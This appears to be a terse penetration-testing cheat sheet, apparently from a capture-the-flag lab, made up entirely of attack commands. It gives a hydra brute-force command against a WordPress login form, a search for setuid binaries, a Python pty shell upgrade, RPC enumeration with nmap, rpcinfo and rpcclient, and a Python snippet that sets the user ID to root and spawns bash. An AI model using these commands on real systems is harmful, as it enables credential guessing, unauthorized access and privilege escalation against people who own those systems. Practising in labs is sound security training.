### Brute Force 

hydra -vV -L fsociety.dic -p test 192.168.56.3 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'

### find (setuid or setgid) binaries

find / -perm -u=s -type f 2>/dev/null




### Getting Interactive Shell



python -c 'import pty; pty.spawn("/bin/bash")'

$ export SHELL=bash
$ export TERM=xterm256-color
$ stty rows 38 columns 116


export TERM=xterm


### RPC exploiting

nmap -sV -p 111,51926 192.168.56.6

rpcinfo -p 192.168.56.6

rpcclient -U% 192.168.56.6


### Make me root

import os

os.setuid(0)
os.setgid(0)
os.system("/bin/bash")
